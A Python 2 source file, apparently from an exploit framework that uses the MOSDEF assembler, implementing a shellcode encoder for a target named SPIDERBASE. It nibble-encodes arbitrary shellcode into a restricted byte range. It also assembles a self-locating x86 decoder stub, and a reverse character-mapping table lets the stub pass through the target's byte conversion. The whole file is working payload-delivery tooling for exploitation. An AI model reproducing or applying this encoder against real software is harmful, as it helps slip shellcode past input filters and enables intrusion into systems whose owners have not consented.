#! /usr/bin/env python
# SPIDERBASE specific X86 nibbleer/decoder
#
# 0x20-0x2f is an untouched byte range
# we can use this to make a clean nibble
# encoded string

# update: 0x22 (") causes trouble! switching to 0x40

import sys
if "." not in sys.path:
    sys.path.append(".")
from internal import *

from MOSDEF import mosdef

class babbel:
    def __init__(self):
        pass

    def makePayload(self, shellcode):
        # returns a SPIDERBASE version of your payload with a decoder at the beginning
        payload = self.encode(shellcode) + "\x51\x52\x53\x54" # END TAG !!!
        decoder = self.assembleDecoder()
        # reverse map the decoder
        decoder = self.reverseMap(decoder)
        return decoder + payload
    
    def encode(self, raw, safebase=0x30):
        # very simple algorithm, high 4 bits of a byte become safe range
        encoded = ""
        for c in raw:
            encoded += chr(((ord(c) & 0xf0) >> 4) | (safebase & 0xf0))
            encoded += chr((ord(c) & 0x0f) | (safebase & 0xf0))
        for c in encoded:
            pass
            #print "%.2X |"%ord(c),
        #print "[!] encoded len: %d bytes"%len(encoded)
        return encoded

    def decode(self, encoded):
        # mock up of the decode algo, len will always be a power of 2
        decoded = ""
        e_len = len(encoded)
        i = 0
        while i != e_len:
            decoded += chr(((ord(encoded[i]) & 0x0f) << 4) | (ord(encoded[i+1]) & 0x0f))
            i += 2
        for c in decoded:
            pass
            #print "%.2X |"%ord(c),
        #print "[!] decoded len: %d bytes"%len(decoded)
        return decoded

    def assembleDecoder(self):
        SMALL = """
        jmp getloc
        gotloc:
        popl %esi

        pushl %esi
        popl %edi
        pushl %esi
        
        decode:
        //movl (%esi),%edx // dl has high bits, dh has low bitsi
        pushl (%esi)
        popl %edx

        // check for end tag
        cmpl $0x54535251,%edx
        je done
        nop
        nop
        nop
        
        incl %esi
        incl %esi

        zeroecx:
        nop
        loop zeroecx
                
        incl %ecx
        incl %ecx
        incl %ecx
        incl %ecx
        
        // ugly for good bytes
        
        shl %cl,%dh
        shr %cl,%dh
        shl %cl,%dl // similar to and 0x0f
       
        pushl %edx
        popl %ebx
        
        shr %cl,%ebx
        shr %cl,%ebx

        orl %edx,%ebx
       
        //or %dh,dl
        movl %edi,%ecx
        movb %bl,(%ecx)
        incl %edi

        nop
        nop
        jmp decode

done:
        jmp *(%esp)
       
        getloc:
        call gotloc
        """
        
        decode = SMALL
        decode = mosdef.assemble(decode, "X86")
        return decode
        

    def reverseMap(self, assembled):
        # this does a reverse mapping on our encoder bytes, f.ex. if we need to end up with 0x80
        # for andb, we put in c7..this will only work with single byte mappings
        ucMap = {"\x00" : "", "\x01" : "\x0f\x21", "\x02" : "\x0f\x22", "\x03" : "\x0f\x23", "\x04" : "\x0f\x24", "\x05" : "\x0f\x25", "\x06" : "\x0f\x26", "\x07" : "\x0f\x27", "\x08" : "\x0f\x28", "\x09" : "\x09", "\x0a" : "", "\x0b" : "\x0f\x2b", "\x0c" : "\x0f\x2c", "\x0d" : "", "\x0e" : "\x0f\x2e", "\x0f" : "\x0f\x2f", "\x10" : "\x0f\x30", "\x11" : "\x0f\x31", "\x12" : "\x0f\x32", "\x13" : "\x0f\x33", "\x14" : "\x0f\x34", "\x15" : "\x0f\x35", "\x16" : "\x0f\x36", "\x17" : "\x0f\x37", "\x18" : "\x0f\x38", "\x19" : "\x19", "\x1a" : "\x0f\x3a", "\x1b" : "\x0f\x3b", "\x1c" : "\x0f\x3c", "\x1d" : "\x0f\x3d", "\x1e" : "\x0f\x3e", "\x1f" : "\x0f\x3f", "\x80" : "\x14\x20\xac", "\x81" : "\x0f\x81", "\x82" : "\x01\x37", "\x83" : "\x9f", "\x84" : "\x01\x36", "\x85" : "\x01\x28", "\x86" : "\x01\x70", "\x87" : "\x01\x71", "\x88" : "\x03\x88", "\x89" : "\x02\x7a", "\x8a" : "\x06\xe6", "\x8b" : "\x01\x2e", "\x8c" : "\x01\x40", "\x8d" : "\x0f\x8d", "\x8e" : "\x06\xa6", "\x8f" : "\x0f\x8f", "\x90" : "\x0f\x90", "\x91" : "\x01\x2b", "\x92" : "\x01\x2c", "\x93" : "\x01\x26", "\x94" : "\x01\x38", "\x95" : "\x01\x07", "\x96" : "\x01\x29", "\x97" : "\x01\x2a", "\x98" : "\x03\x98", "\x99" : "\x01\x76", "\x9a" : "\x06\xe7", "\x9b" : "\x01\x2f", "\x9c" : "\x01\x41", "\x9d" : "\x0f\x9d", "\x9e" : "\x06\xa7", "\x9f" : "\x01\x42", "\xa0" : "\xff", "\xa1" : "\xad", "\xa2" : "\xbd", "\xa3" : "\x9c", "\xa4" : "\xcf", "\xa5" : "\xbe", "\xa6" : "\xdd", "\xa7" : "\xf5", "\xa8" : "\xf9", "\xa9" : "\xb8", "\xaa" : "\xa6", "\xab" : "\xae", "\xac" : "\xaa", "\xad" : "\xf0", "\xae" : "\xa9", "\xaf" : "\xee", "\xb0" : "\xf8", "\xb1" : "\xf1", "\xb2" : "\xfd", "\xb3" : "\xfc", "\xb4" : "\xef", "\xb5" : "\xe6", "\xb6" : "\xf4", "\xb7" : "\xfa", "\xb8" : "\xf7", "\xb9" : "\xfb", "\xba" : "\xa7", "\xbb" : "\xaf", "\xbc" : "\xac", "\xbd" : "\xab", "\xbe" : "\xf3", "\xbf" : "\xa8", "\xc0" : "\xb7", "\xc1" : "\xb5", "\xc2" : "\xb6", "\xc3" : "\xc7", "\xc4" : "\x8e", "\xc5" : "\x8f", "\xc6" : "\x92", "\xc7" : "\x80", "\xc8" : "\xd4", "\xc9" : "\x90", "\xca" : "\xd2", "\xcb" : "\xd3", "\xcc" : "\xde", "\xcd" : "\xd6", "\xce" : "\xd7", "\xcf" : "\xd8", "\xd0" : "\xd1", "\xd1" : "\xa5", "\xd2" : "\xe3", "\xd3" : "\xe0", "\xd4" : "\xe2", "\xd5" : "\xe5", "\xd6" : "\x99", "\xd7" : "\x9e", "\xd8" : "\x9d", "\xd9" : "\xeb", "\xda" : "\xe9", "\xdb" : "\xea", "\xdc" : "\x9a", "\xdd" : "\xed", "\xde" : "\xe8", "\xdf" : "\xe1", "\xe0" : "\x85", "\xe1" : "\xa0", "\xe2" : "\x83", "\xe3" : "\xc6", "\xe4" : "\x84", "\xe5" : "\x86", "\xe6" : "\x91", "\xe7" : "\x87", "\xe8" : "\x8a", "\xe9" : "\x82", "\xea" : "\x88", "\xeb" : "\x89", "\xec" : "\x8d", "\xed" : "\xa1", "\xee" : "\x8c", "\xef" : "\x8b", "\xf0" : "\xd0", "\xf1" : "\xa4", "\xf2" : "\x95", "\xf3" : "\xa2", "\xf4" : "\x93", "\xf5" : "\xe4", "\xf6" : "\x94", "\xf7" : "\xf6", "\xf8" : "\x9b", "\xf9" : "\x97", "\xfa" : "\xa3", "\xfb" : "\x96", "\xfc" : "\x81", "\xfd" : "\xec", "\xfe" : "\xe7", "\xff" : "\x98", }
        # add the clean range
        for i in range(0x20, 0x80):
            ucMap[chr(i)] = chr(i)
            
        # build the reverse map
        rMap = {}
        for key in ucMap:
            rMap[ucMap[key]] = key
            
        # check the assembled string, replace bytes by their single byte counterpart where necesary
        sane = ""
        diff = 0
        unmapped = 0
        #print "[!] starting reverse map..."
        for c in assembled:
            if c in rMap.keys():
                sane += rMap[c]
                #print "[!] reverse mapped %.2X to %.2X"%(ord(c), ord(rMap[c])),
                if c != rMap[c]:
                    devlog("babble","[!] diff byte"); 
                    diff += 1
                else:
                    pass
                    #print ""
            else:
                devlog("babble","[!] no reverse mapping for byte: %.2X"%ord(c)); 
                unmapped += 1
        devlog("babble", "[!] reverse map stats: %d diff bytes, %d unmapped bytes"%(diff, unmapped))
        return sane

# testing routines
if __name__ == "__main__":
    test = babbel()
    d = test.encode("\x41\x42\x43\x00", 0x20)
    test.decode(d)
    a = test.assembleDecoder()
    print "[!] assembled bytes: "
    for c in a:
        print "%.2X |"%ord(c),
    test.reverseMap(a)
